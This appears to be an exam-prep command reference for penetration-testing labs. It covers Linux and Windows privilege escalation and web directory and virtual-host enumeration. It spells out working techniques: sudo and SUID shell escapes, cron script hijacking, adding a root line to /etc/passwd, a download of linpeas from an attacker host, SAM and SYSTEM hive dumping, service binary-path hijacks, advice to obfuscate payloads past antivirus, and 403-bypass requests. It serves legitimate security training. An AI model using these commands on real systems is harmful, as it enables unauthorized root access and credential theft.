pages.title: Linux Privilege Escalation — Complete Command Reference
pages.description: go from a low-privilege shell to root by checking the five things that actually pay — sudo rights, SUID/SGID, capabilities, cron, and writable system files — **before** running any automated scanner.

blocks.text: Automated tools (LinPEAS, pspy) are excellent at **coverage** and terrible at **judgement**. They print 400 lines; the exam gives you 24 points for acting on the right one. Manual checks cost 15-20 minutes and usually find the intended path; the scanner is for when they don't.
**Order:** manual (Section A-F) → decision point (Section J) → automated (Section H-I) → kernel exploits last.

blocks.title: Who am I and what can I run?

fields.lookFor: group membership (sudo, adm, docker, lxd), `NOPASSWD` entries, `(ALL: ALL) ALL`, and the sudo version.
fields.decision: any `NOPASSWD` binary → Step 02. `(ALL: ALL) ALL` with a known password → `sudo su -`. Nothing → Step 03.
fields.mistake: running `sudo -l` and stopping at the password prompt. If sudo wants a password, you do not have passwordless rights — read the rest of the output anyway.
fields.evidence: the exact `sudo -l` output.

blocks.title: Turn a sudo right into a shell

commands.code:
sudo -l
# then match the binary against GTFOBins, e.g.
sudo vim -c ':!/bin/sh'
sudo find. -exec /bin/sh \; -quit
sudo awk 'BEGIN {system("/bin/sh")}'
sudo env /bin/sh
sudo python3 -c 'import os; os.system("/bin/sh")'
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

fields.lookFor: a `#` prompt.
fields.decision: the listed binary is not in GTFOBins → Step 03 (version bugs) or Step 12 (PATH hijack, if the sudo command calls another binary).
fields.mistake: assuming a sudo rule ending in a specific argument can't be escaped. Payloads usually go **after** the binary, and `;`/`-c` often allow a command.
fields.evidence: `id` as root in the same session where `sudo -l` was shown.

fields.lookFor: versions affected by known sudo bugs (e.g. CVE-2021-3156 "Baron Samedit", CVE-2019-14287 `-u#-1`).
fields.decision: version matches a public advisory → read the exploit's requirements before running it. Many need specific sudoers entries.
fields.next: exploit, or move to Section B.
fields.mistake: firing a sudo CVE because the version "looks old" without checking the distribution's backported patches.
fields.evidence: the version string plus the advisory.

fields.lookFor: anything outside the standard set (su, passwd, mount, ping, sudo). Unusual names are the lead.
fields.decision: a non-standard binary → Step 05. Only standard binaries → check versions and move to Section C.
fields.mistake: ignoring the **owner**. A SUID binary owned by root is interesting; one owned by a normal user is usually a leftover.
fields.evidence: the file list with `ls -l` for the interesting entries.

fields.lookFor: a `#` prompt, or a file-read primitive.
fields.decision: not in GTFOBins → `strings` it for embedded paths, check its version, or look for a shared-library hijack.
fields.mistake: running a SUID binary in a directory you control and losing the privilege because the binary drops it. Check `ls -l` for the `s` bit before and after.
fields.evidence: `id` showing `euid=0`.

fields.lookFor: SGID binaries in unusual groups (adm, disk), and root-owned scripts you can edit.
fields.decision: a root-owned script or binary you can write → replace its contents with a shell (keep a backup first).
fields.mistake: overwriting a file you need later. Copy it to `/tmp` first.
fields.evidence: the writable file and its new behaviour.

fields.lookFor: `cap_setuid+ep`, `cap_setgid+ep`, `cap_dac_read_search+ep`, `cap_sys_admin+ep`.
fields.decision: `cap_setuid` on an interpreter → Step 08. `cap_dac_read_search` → read `/etc/shadow` directly.
fields.mistake: looking only for SUID and forgetting capabilities, which are the modern equivalent and far less noisy.
fields.evidence: the `getcap` line.

commands.code:
# cap_setuid on python
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
# cap_dac_read_search

 -c 'print(open("/etc/shadow").read())'

fields.lookFor: a root shell or the shadow file.
fields.decision: root shell → proof. Shadow readable → crack hashes, then `su`.
fields.mistake: using the wrong interpreter path — `getcap` names the exact binary; use that one.
fields.evidence: `id` after the escape.

fields.lookFor: a job running as root that executes a script in a writable location, or a wildcard (`*`) in a directory you control.
fields.decision: writable script → Step 10. Wildcard in a writable dir → tar/rsync wildcard injection.
fields.mistake: only running `crontab -l` — that shows **your** jobs, not root's. `/etc/crontab` and `/etc/cron.d` matter more.
fields.evidence: the crontab line with its user field.

commands.code:
ls -la /path/to/script.sh
cp /path/to/script.sh /tmp/script.sh.bak
printf '#!/bin/sh
cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash
' > /path/to/script.sh
# wait for the next run
/tmp/rootbash -p

fields.lookFor: `/tmp/rootbash` appearing with the SUID bit.
fields.decision: the job is not writable → check whether its **directory** is (you can replace the script), or whether it calls a binary via a relative path.
fields.mistake: making the payload noisy or deleting the original script. Back it up; the box must stay usable.
fields.evidence: the modified script, the resulting SUID binary, `id` as root.

blocks.title: Check the files that define identity

fields.lookFor: `-rw-rw-rw-` on `/etc/passwd`, or any write bit for your user on shadow/sudoers.
fields.decision: passwd writable → Step 12. shadow readable → Step 13.
fields.mistake: assuming `/etc/passwd` is never writable. Misconfigured containers and lab builds do it often.
fields.evidence: the `ls -l` line.

commands.code:
openssl passwd -1 -salt x pwned
# append: pwned:<HASH>:0:0:root:/root:/bin/bash
echo 'pwned:<HASH>:0:0:root:/root:/bin/bash' >> /etc/passwd
su pwned

fields.lookFor: a root shell from `su pwned`.
fields.decision: `su` asks for a password → the hash format is wrong; regenerate it.
fields.mistake: using a modern `$6$` hash in the passwd field — `su` expects the format the system's PAM is configured for; MD5 (`$1$`) is the safe default in labs.
fields.evidence: the new line and `id` after `su`.

commands.code:
cat /etc/shadow 2>/dev/null | head
# if writable, replace root's hash with a known one
openssl passwd -1 -salt x pwned

fields.lookFor: readable hashes → crack offline; writable → replace root's hash.
fields.decision: crack succeeds → `su root`.
fields.mistake: cracking with the wrong mode. Confirm the hash prefix (`$1$` MD5, `$6$` SHA-512) before choosing a hashcat mode.
fields.evidence: the hash line and the recovered password.

commands.code:
echo $PATH
# if a root cron/SUID program calls a binary without a full path:
mkdir -p /tmp/evil && printf '#!/bin/sh
/bin/sh
' > /tmp/evil/<BINARY>
chmod +x /tmp/evil/<BINARY>
export PATH=/tmp/evil:$PATH

fields.lookFor: a root-run program that calls `service`, `ps`, `ifconfig` etc. without `/usr/bin/`.
fields.decision: the program runs with a clean PATH → this fails; check for relative-path execution instead.
fields.mistake: assuming every cron job inherits your PATH. Most define their own; verify before spending time.
fields.evidence: the hijacked binary and the root shell it produced.

commands.code:
showmount -e <TARGET_IP>
mkdir -p /tmp/nfs && sudo mount -t nfs <TARGET_IP>:/<SHARE> /tmp/nfs -o nolock
sudo cp /bin/bash /tmp/nfs/rootbash && sudo chmod +s /tmp/nfs/rootbash
# on the target:
/tmp/nfs/rootbash -p

fields.lookFor: `no_root_squash` in `/etc/exports`, and a SUID bash you created from Kali.
fields.decision: the mount is read-only or squashes root → dead end; try writing a cron entry instead.
fields.next: run the binary on the target.
fields.mistake: creating the SUID file as your normal user — it must be created by **root** (hence `sudo` on Kali) for the bit to survive.
fields.evidence: the `showmount` output and `id` on the target.

fields.lookFor: database passwords in web configs, SSH keys, backup archives, a `.bash_history` containing `mysql -u root -p...`.
fields.decision: a password works for `su`/`sudo` → done. A key is found → try it against local users.
fields.mistake: only grepping for the word "password". Also search `pass`, `pwd`, `secret`, `token`, and connection strings.
fields.evidence: the file path and the exact line.

commands.code:
ps aux --sort=-%cpu | head -20
ss -tlnp
id
docker ps 2>/dev/null

fields.lookFor: a root process running from a writable directory, an internal service bound to [localhost](http://localhost), and membership of `docker` or `lxd`.
fields.decision: `docker` group → Step 18. Root process in a writable path → Step 10 logic.
fields.next: Step 18, or pivot to the internal service.
fields.mistake: ignoring [localhost](http://localhost)-only ports — they are usually the unreachable-from-outside admin service that grants root.
fields.evidence: the process/port list.

fields.lookFor: a shell with the host filesystem mounted at `/mnt`.
fields.decision: image not present and no internet → use an existing image (`docker images`).
fields.mistake: treating docker group membership as a minor finding. It is root, every time.
fields.evidence: `id` inside the chroot.

commands.code:
uname -a; cat /etc/os-release
searchsploit linux kernel $(uname -r | cut -d- -f1)

fields.lookFor: a kernel version matching a local privilege-escalation CVE (DirtyPipe, PwnKit via pkexec, OverlayFS).
fields.decision: a match → read the exploit fully; confirm the distro's patch level before running. **Prefer a configuration flaw over a kernel exploit** on the exam — a kernel panic costs the machine.
fields.next: run only after a snapshot/revert is acceptable.
fields.mistake: running DirtyPipe/PwnKit blind because the kernel "looks old". Check `pkexec --version` and the patch date.
fields.evidence: the version, the exploit name, and why you believed it applied.

commands.code:
# serve from Kali
python3 -m http.server 8000
# on target
wget http://<ATTACKER_IP>:8000/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh -a 2>&1 | tee <OUTPUT_FILE>

fields.lookFor: the red/yellow 99% findings — SUID, capabilities, cron, `.ssh`, credentials, kernel.
fields.decision: every red finding still needs manual confirmation. LinPEAS reports possibilities, not vulnerabilities.
fields.next: verify the top finding by hand, then exploit it.
fields.mistake: pasting LinPEAS output into a report as if it were a finding. The report needs the command you ran **after** it.
fields.evidence: the scan output (as an appendix) plus your manual confirmation.

fields.lookFor: recurring root commands with relative paths, writable scripts, or credentials in arguments.
fields.decision: a repeating job appears → Step 10.
fields.next: modify the target of the job.
fields.mistake: running pspy for 30 seconds. Cron fires on the minute — watch for at least 2-3 minutes.
fields.evidence: the command line of the job you hijacked.

sections.rawTitle: I. Decision tree: manual to automated

blocks.text: | What you found | Do this | Do **not** | | --- | --- | --- | | `NOPASSWD` sudo binary | GTFOBins (Step 02) | Assume you need a password | | Unusual SUID binary | GTFOBins / version check (Step 05) | Run kernel exploits first | | `cap_setuid` | Interpreter escape (Step 08) | Ignore capabilities | | Writable root cron script | Replace payload (Step 10) | Delete the original | | Writable `/etc/passwd` | Add root user (Step 12) | Edit root's existing line and lock yourself out | | `no_root_squash` NFS | SUID bash from Kali (Step 15) | Create it as a normal user | | Credentials in a config | Reuse locally (Step 16) | Crack what you already have | | Docker group | chroot escape (Step 18) | Treat it as low severity | | **Nothing after 20-30 min of manual** | Run LinPEAS (Step 20) | Keep repeating the same checks | | LinPEAS noisy, nothing conclusive | pspy for 3-5 min (Step 21) | Run kernel exploits blindly | | Kernel CVE matches | Read it, then decide (Step 19) | Panic the box on a hunch |
**Hard rule:** after 45 minutes without a vector, revert and re-read the enumeration. A fresh look beats a fourth scanner.

| Symptom | Cause | Fix | | --- | --- | --- | | `sudo -l` asks for a password | No passwordless rule | Look for credentials; check `sudo -V` | | SUID binary drops privileges | It calls `setuid(getuid())` | Look for a different binary | | Cron edit has no effect | Wrong user field, or cron not running | Check `systemctl status cron`; use `/etc/cron.d` | | `su` rejects the new account | Hash format | Regenerate with `openssl passwd -1` | | Reverse shell never connects | Target cannot reach Kali (pivot) | See the pivoting note below | | `getcap` prints nothing | No capabilities set | Normal — move on | | Exploit compiles but fails | Missing headers/arch mismatch | Compile statically on Kali with the same arch |

**Pivoting variant.** If the target can only reach an internal pivot, a reverse shell to Kali will never connect. Either catch it on the pivot host (`ssh -R` / chisel) or use a bind shell and reach it with `proxychains4`. Confirm the direction of reachability **before** you spend time on an exploit that needs a callback.

items: `id; sudo -l; sudo -V`
Match sudo rights to GTFOBins.
`find / -perm -4000 -type f 2>/dev/null` → GTFOBins.
`getcap -r /` → interpreter escape.
`/etc/crontab` + `/etc/cron.d` + timers → writable script.

Credentials on disk → reuse.

NFS `no_root_squash` if exported.
Still nothing → LinPEAS → pspy → kernel.
The `sudo -l` output that justified the path.
The exact binary/permission that was wrong (`ls -l`).
The command that produced the root shell, and `id` as root.
`cat /root/proof.txt` **and** `ip addr` in the same screenshot.

pages.title: Windows Privilege Escalation — Complete Command Reference
pages.description: take a Windows shell to SYSTEM/Administrator by checking services, token privileges, install policies and stored credentials — in that order, with automated scanners only after the manual pass.

blocks.text: winPEAS and PrivescCheck produce hundreds of lines of "possible" findings. The exam scores a **decision**, not a scan. Manual checks (15-20 minutes) find the intended path; the scanners catch what you missed.
**Order:** identity → services → tasks → install policy → credentials → tokens → registry → scanner → kernel.

blocks.title: Who am I, and what can I do?

fields.lookFor: `SeImpersonatePrivilege`, `SeAssignPrimaryTokenPrivilege`, `SeBackupPrivilege`, `SeRestorePrivilege`, `SeTakeOwnershipPrivilege`, and membership of `Administrators`, `Backup Operators`.
fields.decision: `SeImpersonate` enabled → Section F (potato). `SeBackup` → dump SAM/SYSTEM. Admin group but unelevated (UAC) → try `runas`/UAC bypass only if the token allows.
fields.mistake: stopping at `whoami`. The **privileges** list is the single highest-value output on Windows.
fields.evidence: the `whoami /priv` block.

fields.lookFor: OS build, architecture, hotfix list, install date.
fields.decision: an old build missing a specific patch → Section I. A modern build → configuration/credential paths, not kernel exploits.
fields.mistake: using `systeminfo` alone to claim "unpatched". Compare the **build number** with the advisory's fixed build.
fields.evidence: OS name, build, and the hotfix list.

commands.code:
net user
net localgroup administrators
net localgroup "Remote Desktop Users"

fields.lookFor: non-standard accounts, a service account in Administrators, guest enabled.
fields.decision: a service account with a weak password → credential path. No second admin account → focus on privilege escalation, not lateral movement.
fields.mistake: assuming an account called `svc_backup` is unprivileged. Check its groups.
fields.evidence: the group listing.

commands.code:
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\"
sc query state= all

fields.lookFor: auto-start services whose binary path is **unquoted and contains spaces**, or lives in a user-writable directory.
fields.decision: unquoted path with spaces → Step 05. Writable binary/directory → Step 06.
fields.mistake: only looking at running services. Stopped auto-start services are equally exploitable and less noticed.
fields.evidence: the service name and its exact `PathName`.

fields.lookFor: `BINARY_PATH_NAME: C:Program FilesVulnerable Appservice.exe` — no quotes, spaces in the path.
fields.decision: you can write to `C:Program.exe` or `C:Program FilesVulnerable.exe` → drop a payload there, then restart the service. No write access → dead end.
fields.mistake: testing writability by trying to create the file. Use `icacls` first, and clean up anything you create.
fields.evidence: the service config plus the writable directory.

commands.code:
icacls "C:\Path\To\service.exe"
sc config <SERVICE_NAME> binpath= "C:\temp\shell.exe"
sc stop <SERVICE_NAME>
sc start <SERVICE_NAME>

fields.lookFor: `(F)` or `(M)` for your user on the binary or its directory, or `SERVICE_CHANGE_CONFIG` rights.
fields.decision: can change the path → point it at your payload. Can only overwrite the file → back it up first.
fields.next: the service starts as SYSTEM and runs your payload.
fields.mistake: not restoring the original binary. A broken service can break the box for later steps.
fields.evidence: before/after `sc qc`, and the shell.

fields.lookFor: `SERVICE_ALL_ACCESS`, `SERVICE_CHANGE_CONFIG`, `SERVICE_START` on a service running as SYSTEM.
fields.decision: `CHANGE_CONFIG` → Step 06. `SERVICE_STOP/START` only → hijack the binary path indirectly.
fields.mistake: running accesschk without `/accepteula` in a non-interactive shell — it hangs on the EULA prompt.
fields.evidence: the permission line for the service.

commands.code:
schtasks /query /fo LIST /v
schtasks /query /fo LIST /v | findstr /i "TaskName Run As"

fields.lookFor: tasks running as SYSTEM/Administrator that execute a script in a writable location.
fields.decision: writable script → replace it (back it up). Task file writable but not the action → check the task's XML permissions.
fields.mistake: assuming all tasks run as SYSTEM. Read the "Run As User" line.
fields.evidence: the task name, action path, and run-as user.

commands.code:
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

fields.lookFor: **both** values `0x1`.
fields.decision: both set → Step 10. Only one set → not exploitable; move on.
fields.mistake: seeing `0x1` in one hive and declaring victory. The policy requires **both** HKLM and HKCU.
fields.evidence: both registry outputs.

fields.lookFor: a SYSTEM shell on your listener.
fields.decision: no callback → check the MSI architecture (x86 vs x64) and your listener.
fields.mistake: building the MSI on the target with a tool that is not present. Generate it on Kali and transfer it.
fields.evidence: the registry state, the MSI command, and the resulting shell.

commands.code:
cmdkey /list
dir C:\Users\*\AppData\Roaming\Microsoft\Credentials 2>nul
type C:\Windows\Panther\unattend.xml 2>nul
type C:\Windows\System32\sysprep\sysprep.inf 2>nul
reg query HKLM\SOFTWARE\<VENDOR> /s /f password 2>nul

fields.lookFor: saved RDP/domain credentials in `cmdkey`, base64 passwords in `unattend.xml`, plaintext service passwords in the registry.
fields.decision: a credential is found → `runas /savecred` or PsExec with it. No credential → Section F.
fields.mistake: reading `unattend.xml` and skipping the base64 decode. `echo <B64> | base64 -d` (or PowerShell) reveals the password.
fields.evidence: the file path and the recovered credential.

commands.code:
reg save HKLM\SAM C:\temp\sam.hive
reg save HKLM\SYSTEM C:\temp\system.hive

fields.lookFor: two hive files you can download (via SMB, `certutil`, or a base64 transfer).
fields.decision: files obtained → dump hashes offline with `impacket-secretsdump -sam sam.hive -system system.hive LOCAL`.
fields.mistake: trying `reg save` without `SeBackupPrivilege` — it fails silently for a normal admin in some configurations.
fields.evidence: the hive files and the recovered hashes.

fields.lookFor: `SeImpersonatePrivilege` **Enabled**.
fields.decision: enabled → Step 14. Present but disabled → try to enable it, or find a service that impersonates for you.
fields.mistake: confusing `Enabled` with `Disabled` in the output. The state column matters.
fields.evidence: the privilege line.

fields.lookFor: `nt authority\system`.
fields.decision: the exploit fails → the OS build may have patched that specific technique (PrintSpoofer for older builds, GodPotato/RoguePotato for newer). Try the variant that matches the build.
fields.mistake: running a potato exploit on a build that patched it and concluding "SeImpersonate is useless". Try a different family member.
fields.evidence: `whoami` returning SYSTEM.

fields.lookFor: `FullControl` or `SetValue` granted to `Users`/`Authenticated Users` on a key that a privileged process reads.
fields.decision: writable key used by a service → change its `ImagePath` or configuration to point at your payload.
fields.mistake: picking a key nobody reads. Find the key that the vulnerable service actually consumes.
fields.evidence: the ACL and the value you changed.

fields.lookFor: listeners on `127.0.0.1` with a PID, especially on high ports.
fields.decision: an admin service bound to [localhost](http://localhost) → tunnel to it (portproxy or SSH) and attack it as root.
fields.mistake: ignoring [localhost](http://localhost) listeners because "there is nothing remote". They are often the intended privesc path.
fields.evidence: the `netstat` line with PID and the matching process.

fields.lookFor: red "known vulnerability" blocks, service misconfigurations, credentials, AlwaysInstallElevated.
fields.decision: each red block still needs manual confirmation (Sections B-G).
fields.next: verify the top finding by hand.
fields.mistake: pasting winPEAS output as a finding. The report needs the exploit you ran and its output.
fields.evidence: the scan output as an appendix.

fields.lookFor: a structured list of findings with severity, plus registry and policy checks winPEAS sometimes buries.
fields.decision: cross-reference with the manual pass; PrivescCheck is quieter and more readable in a report.
fields.mistake: running it without `-Extended` and missing policy checks.
fields.evidence: the exported report.

fields.lookFor: a build number matching a local privilege-escalation CVE.
fields.decision: a match exists → read the exploit, confirm the architecture, and accept the crash risk. On the exam, prefer a configuration flaw.
fields.next: run only if a revert is acceptable.
fields.mistake: running MS16-032/MS17-010-style exploits on a patched build and hanging the box.
fields.evidence: build number, exploit name, and the reason it applies.

sections.title: Decision tree: manual to automated
sections.rawTitle: K. Decision tree: manual to automated

blocks.text: | What you found | Do this | Do **not** | | --- | --- | --- | | `SeImpersonate` enabled | Potato family (Step 14) | Ignore it and run winPEAS | | Unquoted service path + writable dir | Plant binary, restart service (Step 05) | Overwrite the existing binary | | Service with weak config rights | `sc config` to your payload (Step 06) | Restart blindly without a backup | | Writable scheduled-task script | Replace payload (Step 08) | Wait a day for the trigger — run the task | | AlwaysInstallElevated = 1/1 | MSI payload (Step 10) | Assume one hive is enough | | Saved credentials in cmdkey | `runas /savecred` (Step 11) | Crack what is already usable | | SeBackupPrivilege | Dump SAM/SYSTEM (Step 12) | Try to read the hives directly | | Writable registry key | Repoint the service (Step 15) | Guess which key is used | | [Localhost](http://Localhost)-only service | Tunnel and attack it (Step 16) | Declare "no privesc" | | **Nothing after 20-30 min** | winPEAS (Step 17) | Repeat the same checks | | winPEAS noisy | PrivescCheck (Step 18) | Run kernel exploits blindly | | Build matches a CVE | Decide, then run (Step 19) | Crash the box on a hunch |
**Hard rule:** if you are 45 minutes in with no vector, revert and re-read your own enumeration. A fresh pass beats a fourth scanner.

| Symptom | Cause | Fix | | --- | --- | --- | | `accesschk` hangs | EULA prompt | Add `/accepteula` | | `sc` syntax error | Missing space after `=` | `binpath= "C:\path"` — the space is required | | Potato exploit returns nothing | Technique patched on this build | Try another family member or another path | | MSI installs but no callback | Architecture mismatch / listener | Rebuild for the target arch; check `LPORT` | | `reg save` access denied | No SeBackupPrivilege | Use another credential path | | Payload deleted by AV | Defender active | Try an obfuscated/encoded payload, or a different vector | | Shell dies instantly | Payload exits | Use a staged/looping payload; catch again | | RDP/PsExec fails but SMB works | Firewall on 3389/445 | Use WinRM (5985) or SMB-based exec |

**Pivoting variant.** If the Windows host can only reach an internal pivot, a reverse shell to Kali will not connect. Forward a port from the pivot (`ssh -L`) and catch the shell there, or use a bind shell reached through `proxychains4`. Impacket through a pivot: `proxychains4 impacket-wmiexec <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP>`.

items: `whoami /priv` + `whoami /groups`.
`systeminfo` + `wmic qfe`.
Services: unquoted paths, writable binaries, `accesschk`.
Scheduled tasks and their scripts.
`AlwaysInstallElevated` both hives.
`cmdkey /list`, unattend/sysprep, registry passwords.
`SeImpersonate` → potato.
Registry ACLs, [localhost](http://localhost) services.
winPEAS → PrivescCheck.
Kernel exploit last.
`whoami /priv` (the privilege that justified the path).
`sc qc` output or the ACL that showed the misconfiguration.
The exact command that produced SYSTEM, and `whoami` afterwards.
`type C:\Users\Administrator\Desktop\proof.txt` plus `ipconfig` in one screenshot.
Any service you modified — note whether you restored it.

pages.title: Directory & Virtual Host Enumeration — ffuf, Gobuster, Feroxbuster
pages.description: find what a web server hides — directories and files on a host you already know, and **other hostnames** served by the same IP. These are different questions with different tools; mixing them wastes the most time of any enumeration step.

rows: response differs from the default vhost

blocks.text: **Subdomain vs vhost.** DNS enumeration asks the resolver, "does this name exist?" Vhost enumeration asks the web server, "do you serve a different site for this `Host:` header?" A name can be a working vhost with **no** DNS record, and a DNS name can point at a server that only shows its default page. On the exam, always run **both** when you see a domain.

fields.lookFor: the expected line counts (raft-medium-directories ≈ 30k, raft-small-words ≈ 43k, dirb common ≈ 4.6k).
fields.decision: first pass → `dirb/common.txt` (fast). Solid pass → `raft-medium-directories.txt`. Vhosts → `raft-small-words.txt` or a subdomain list.
fields.mistake: starting a 30k-word scan before a 4.6k one. The first pass finds the obvious app; the big list is for when it does not.
fields.evidence: the wordlist path and line count.

fields.lookFor: server header, redirects, `robots.txt` entries, and the **404 size** — the number you will filter on.
fields.decision: a 404 returns a custom page with a stable size → add `-fs `. A wildcard returns 200 for everything → Step 15.
fields.mistake: skipping the baseline and then filtering by status code alone. Custom 404 pages commonly return 200.
fields.evidence: the 404 status and size.

fields.lookFor: hits with a size different from the baseline, and `301` redirects that reveal a directory.
fields.decision: a directory appears → re-run with `FUZZ` inside it (`-u http://<TARGET_IP>/found/FUZZ`). A file appears → fetch it. Nothing → Step 04 with a bigger list.
fields.next: Step 06 for extensions, Step 09 for authenticated paths.
fields.mistake: leaving `-ac` off a wildcard server — every word becomes a hit and the output is useless.
fields.evidence: the ffuf output with the matched sizes.

fields.lookFor: `Status: 200 [Size:...]` lines and `Found` redirects.
fields.decision: gobuster is faster and quieter than ffuf for a plain directory pass; keep it for the first sweep, ffuf for filtering tricks.
fields.mistake: forgetting `-x` — without extensions you miss `index.php`, `config.txt`, `backup.html`.
fields.evidence: the gobuster summary and hits.

fields.lookFor: a tree of found directories, automatically recursed, and a written report at `<OUTPUT_FILE>`.
fields.decision: a deep app (many nested dirs) → feroxbuster saves the most time. Shallow app → gobuster is enough.
fields.next: review the output file for `200`/`301` entries.
fields.mistake: letting recursion run unbounded on a large app. Add `--depth 2` and `-t 30` to stay in control.
fields.evidence: the `<OUTPUT_FILE>` contents.

commands.code:
ffuf -u http://<TARGET_IP>/FUZZ -w <WORDLIST> -e.php,.txt,.html,.bak -t 40
ffuf -u http://<TARGET_IP>/FUZZ -w <WORDLIST> -recursion -recursion-depth 2
gobuster dir -u http://<TARGET_IP> -w <WORDLIST> -x php,aspx,jsp,html,txt
feroxbuster -u http://<TARGET_IP> -w <WORDLIST> --depth 2 -x php,html

fields.lookFor: source backups (`.bak`, `.old`, `~`), config files (`.env`, `.git/HEAD`), and admin panels.
fields.decision: the stack is known (PHP, [ASP.NET](http://ASP.NET), Java) → match the extension list to it instead of guessing all.
fields.next: Step 07 if the output is noisy.
fields.mistake: adding extensions to **every** word, which multiplies requests by the number of extensions. Use a file-oriented list instead.
fields.evidence: the hits per extension.

commands.code:
gobuster dir -k -u https://<TARGET_IP> -w <WORDLIST> -x php,txt,html
ffuf -u https://<TARGET_IP>/FUZZ -w <WORDLIST> -k -ac
feroxbuster -u https://<TARGET_IP> -w <WORDLIST> -k

fields.lookFor: the same hits over TLS that you saw over HTTP.
fields.decision: TLS fails entirely → the service may use SNI (Step 16) or a non-standard port; confirm with `curl -k` first.
fields.mistake: letting the scanner abort on certificate errors. Labs almost always use self-signed certificates — `-k` is the normal case, not an exception.
fields.evidence: the HTTPS hit list.

commands.code:
ffuf -u http://<TARGET_IP>/FUZZ -w <WORDLIST> -fs <BASELINE_SIZE>
ffuf -u http://<TARGET_IP>/FUZZ -w <WORDLIST> -fc 404,429
gobuster dir -u http://<TARGET_IP> -w <WORDLIST> -b ""

fields.lookFor: a short, readable hit list.
fields.decision: many identical sizes → filter by size (`-fs`). Many different 404s → filter by code. gobuster hides 404 by default; `-b ""` shows every code.
fields.next: triage with the table in Section D.
fields.mistake: filtering too aggressively and hiding the real hit. Always keep one unfiltered run for comparison.
fields.evidence: the filter used and the resulting hits.

blocks.title: `-mc all` and the 403/500 problem

commands.code:
ffuf -u http://<TARGET_IP>/FUZZ -w <WORDLIST> -mc all -ac
ffuf -u http://<TARGET_IP>/FUZZ -w <WORDLIST> -mc all -fs <BASELINE_SIZE>

fields.mistake: adding `-mc all` and drowning in 10,000 hits. Pair it with `-ac` or a size filter, every time.
fields.evidence: the exact matcher/filter used.

blocks.notes:
**What it actually does:** ffuf's default matcher is `200-299,301,302,307,401,403,405,500` — **403 and 500 already appear by default**. `-mc all` does not "unhide" them; it adds the codes outside that list (`300, 304, 400, 402, 406, 409, 418, 429, 503`…).
**When it matters:** the app answers `429` when it rate-limits you (a WAF telling you it noticed), `503` when a backend is down but the path exists, or `304` on conditional requests. Those are invisible without `-mc all`.
**For 403/500 specifically:** the fix is **not** the status code, it is the **baseline**. Compare `-fs` against a known-missing path, or filter the false-positive class with `-fc 403,500` and inspect what remains.

fields.lookFor: paths that only exist for a logged-in user — admin panels, API routes, user data.
fields.decision: you have a cookie → always re-run the discovery pass authenticated. The unauthenticated result is only half the map.
fields.mistake: forgetting that the cookie value expires mid-scan; re-login and restart, or the whole run is noise.
fields.evidence: the authenticated hit list.

fields.lookFor: a parameter name that changes the response, or a login that returns a different status/length on success.
fields.decision: a hidden parameter appears → test it for injection. A login differential appears → brute force with the Passwords page.
fields.mistake: assuming a 302 is failure. `-fc 200` filters the *failure* page when failure returns 200 — verify both directions first.
fields.evidence: the request and the differing response.

commands.code:
ffuf -u http://<TARGET_IP>/api/FUZZ -w <WORDLIST> -mc all -ac
ffuf -u http://<TARGET_IP>/api/FUZZ -w <WORDLIST> -X POST -H "Content-Type: application/json" -d '{}' -mc all -ac

fields.lookFor: `200` with JSON, `401`/`403` on real routes, `405` meaning the route exists but needs another method.
fields.decision: `405` → re-run with `-X POST`/`-X PUT`. `401` → the route exists; find a token.
fields.next: inspect the schema, then test the parameters.
fields.mistake: treating `404` JSON as "no API". Many frameworks return 404 with a JSON body for unknown routes — compare bodies, not just codes.
fields.evidence: the routes and their responses.

sections.title: Virtual host and subdomain enumeration
sections.rawTitle: C. Virtual host and subdomain enumeration

commands.code:
curl -s -o /dev/null -w "%{size_download}\n" -H "Host: doesnotexist.<DOMAIN>" http://<TARGET_IP>/
ffuf -u http://<TARGET_IP>/ -H "Host: FUZZ.<DOMAIN>" -w <WORDLIST> -fs <DEFAULT_VHOST_SIZE>

fields.lookFor: hosts whose response size differs from the default vhost.
fields.decision: a hit → add `<DOMAIN> <TARGET_IP>` to `/etc/hosts` and browse that hostname directly. No hits → Step 14 (DNS names may still exist).
fields.next: enumerate the new host from Step 03.
fields.mistake: omitting `-fs`. A default vhost answers **every** Host header with 200 and a fixed size; without the filter you get 43,000 "hits".
fields.evidence: the baseline size and the differing hosts.

fields.lookFor: `Found: dev.<DOMAIN> Status: 200 [Size:...]`.
fields.decision: gobuster auto-filters the baseline wildcard, which makes it the quicker first vhost pass; confirm hits with Step 12.
fields.mistake: pointing `-u` at an IP while using `--append-domain` — the Host header becomes `word.<IP>` and nothing matches. Use the domain.
fields.evidence: the found vhosts and their sizes.

fields.lookFor: names that resolve, and names that resolve **and** serve content.
fields.decision: a name resolves → add it to `/etc/hosts`, then run Step 03 against it. A name resolves but shows the default page → still note it; it may be a different app on another port.
fields.mistake: using an internet resolver for an internal domain (`-r 8.8.8.8`). Point `-r` at the internal DNS server (often the DC).
fields.evidence: the resolved names and their IPs.

fields.lookFor: a wildcard A record, or a fixed-size 200 for any Host.
fields.decision: wildcard DNS → filter known IPs; wildcard vhost → always filter by size. Note the wildcard in your report — it explains why brute force "found" thousands of hosts.
fields.mistake: reporting the wildcard as a discovery. It is a server configuration, not a host.
fields.evidence: the wildcard response and the filter that neutralised it.

fields.lookFor: a certificate or page that differs per hostname.
fields.decision: the vhost is selected by **SNI**, not the Host header → use `--resolve` with curl, or `ffuf` with a URL containing the hostname and a hosts-file entry.
fields.mistake: sending `Host:` over HTTPS without SNI and concluding the vhost does not exist. Modern servers frequently split on SNI.
fields.evidence: the certificate CN/SAN and the page.

rows: follow it; the target directory is the real hit
try default creds, then the credential you hold
bypass attempts below; also try the path with `/` and with an extension
slow down (`-rate 10`, `-t 5`) — the WAF is watching
compare size with baseline; test inputs

blocks.text: **403 bypass attempts (Documented — Untested):**

blocks.code:
curl -s -H "X-Original-URL: /admin" http://<TARGET_IP>/
curl -s --path-as-is http://<TARGET_IP>/admin/..;/
curl -s http://<TARGET_IP>/admin%2f
curl -s http://<TARGET_IP>/ADMIN/

